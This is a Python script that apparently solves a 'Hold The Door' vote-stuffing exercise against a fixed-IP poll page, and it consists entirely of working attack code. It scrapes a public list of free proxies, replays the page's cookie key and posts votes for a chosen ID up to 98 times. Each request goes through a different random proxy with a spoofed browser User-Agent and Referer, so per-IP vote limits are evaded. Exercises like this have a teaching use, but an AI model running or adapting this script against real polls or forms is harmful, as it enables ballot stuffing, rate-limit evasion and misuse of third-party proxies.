#!/usr/bin/python3
import requests
from bs4 import BeautifulSoup
import os
import sys
import urllib3
import random
from requests.exceptions import ConnectionError
import socket
def getProxies(url):
    listProxies = []
    proxiReturn = []
    lenCheck = 0
    index = requests.get(url)
    soup = BeautifulSoup(index.content, 'html.parser')
    for i in range(1, 300, 1):
        results = soup.find_all('tr')[i]
        for x in results:
            x = str(x).replace("<td>", "")
            firtsLetter = x.replace("</td>", "")
            if (firtsLetter[0] >= '0' and firtsLetter[0] <= '9'):
                listProxies.append(firtsLetter)
    ran = random.randint(0, 300)
    if (len(listProxies[ran]) > 8):
        proxiReturn.append(str(listProxies[ran]))
        proxiReturn.append(str(listProxies[ran + 1]))
    else:
        proxiReturn.append(str(listProxies[ran - 1]))
        proxiReturn.append(str(listProxies[ran]))
    return proxiReturn
def getVotes(url, id):
    lent = 0
    listId = []
    state = requests.get(url)
    soup = BeautifulSoup(state.content, 'html.parser')
    results = soup.find_all('tr')
    for x in results:
        vote = str(x).replace("<td>", "")
        firtsLetter = vote.replace("</td>", "")
        firtsLetter = firtsLetter.replace("<tr>","")
        firtsLetter = firtsLetter.replace("</tr>","")
        firtsLetter = firtsLetter.replace("\n","")
        firtsLetter = firtsLetter.replace(" ", "\n")
        firtsLetter = firtsLetter.split()
        listId.append(firtsLetter)
    for i in listId:
        if lent > 1:
            if (int(i[0]) == id):
                print("Votes to ID -> {:d} = {}".format(id, i[1]))
                return i[1]
        lent += 1
    print("Votes to ID -> {:d} = 0".format(id))
    return 0
url = "http://158.69.76.135/level4.php"
urlProxies = "https://free-proxy-list.net/index.html"
i = 0
headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0', 'Referer': 'http://158.69.76.135/level4.php'}
with requests.session() as client:
    while i  < 98:
        lenProxi = 0
        os.environ["HTTP_PROXY"] = ""
        votes = getVotes(url, int(sys.argv[1]))
        key = client.get(url)
        key_dic = key.cookies.get_dict()
        cookies = key.cookies['HoldTheDoor']
        data_post = {
			"id": int(sys.argv[1]), # 1992
			"holdthedoor": "Submit",
			"key": key_dic['HoldTheDoor']
		}
        proxies = getProxies(urlProxies)
        os.environ["HTTP_PROXY"] = "http://" + proxies[lenProxi] + ":" + proxies[lenProxi + 1]
        print("Post to " + proxies[lenProxi] + " PORT: " + proxies[lenProxi + 1])
        #os.environ["HTTP_PROXY"] = "http://112.78.191.35:8080"
        #os.system("export HTTP_PROXY=" + '"' + "110.74.222.213:52733" + '"')
        try:
            client.post(url, data=data_post, headers = headers, cookies={'HoldTheDoor': cookies}, timeout=8)
            os.environ["HTTP_PROXY"] = ""
            if (int(getVotes(url, int(sys.argv[1]))) > int(votes)):
                print('\x1b[6;30;42m' + 'Success!' + '\x1b[0m')
                i += 1
            else:
                print('\x1b[6;30;41m' + 'Failed!' + '\x1b[0m')
        except requests.exceptions.Timeout:
            print('\x1b[6;30;41m' + "TimeOut Error..." + '\x1b[0m')
        except urllib3.exceptions.MaxRetryError:
            print('\x1b[6;30;41m' + "MaxRetry Error" + '\x1b[0m')
        except ConnectionResetError:
            print('\x1b[6;30;41m' + "ConnectionReset Error" + '\x1b[0m')
        except requests.exceptions.TooManyRedirects:
            print('\x1b[6;30;41m' + "TooManyRedirects Error" + '\x1b[0m')
        except ConnectionRefusedError:
            print('\x1b[6;30;41m' + "Connection Error" + '\x1b[0m')
        except ConnectionError:
            print('\x1b[6;30;41m' + "Connection Error" + '\x1b[0m')
        except socket.timeout:
            print('\x1b[6;30;41m' + "SocketTime Out Error" + '\x1b[0m')
        except requests.exceptions.ChunkedEncodingError:
            print('\x1b[6;30;41m' + "ChunkedEncodingError" + '\x1b[0m')
        except urllib3.exceptions.ProxyError:
            print('\x1b[6;30;41m' + "ProxyError" + '\x1b[0m')